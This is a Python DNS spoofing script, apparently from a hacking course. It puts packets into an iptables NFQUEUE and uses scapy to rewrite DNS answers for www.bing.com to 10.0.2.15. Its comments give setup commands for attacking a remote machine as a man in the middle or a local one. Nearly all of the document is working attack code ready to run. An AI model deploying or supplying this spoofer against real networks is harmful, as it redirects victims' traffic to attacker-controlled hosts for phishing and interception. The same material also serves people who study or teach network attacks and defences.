#!/usr/bin/env python
'''
use iptables to modify packet routes
iptables allows us to trap all of our packets in a queque

At the BEGINNING
run the following command:
(Against remote computer)
iptables -I FORWARD -j NFQUEUE --queue-num 0
*Only forward chain will be redirected to a queue*
(Against local computer)
iptables -I OUTPUT -j NFQUEUE --queue-num 0
iptables -I INPUT -j NFQUEUE --queue-num 0
*Input and output chain will both be redirected to a queue*


AT The END
run the following command:
iptables --flush

REQUIREMENTS:
pip install netfilterqueue
enable packet forwarding on machine
NOTES:
    1)get_payload() gives us the raw data of the packet
    2)scapy.DNSRR (DNS response short for DNS resource record)
    3)scapy.DNSRQ (DNS request short for DNS question record)
    4)easiest way to generate a dns request is to use the ping command
        Ex) ping -c 1 bing.com
        1 ping request to bing.com
        Easy way to get the ip of any website you want
    5)An A record is one that converts domain names to ips
        We are mainly interested in A records
    6)When creating a DNS response with scapy the only fields that scapy cant autofill are
        rrname
        rdata
'''

import netfilterqueue
import subprocess
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in str(qname):
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.15") #making fake dns response
            scapy_packet[scapy.DNS].an = answer #replacing real DNS reposne with fake inside packet
            scapy_packet[scapy.DNS].ancount = 1 #setting ancount field (number of dns resource records in packet)

            #Making sure packet wont be currpt packet after making changes
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))

    packet.accept()  # forwards packet to destination

try:
    print("[+] Creating packet queue")
    #subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])
    subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"])
    subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"])
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("[-] Removing packet queue")
    subprocess.call(["iptables", "--flush"])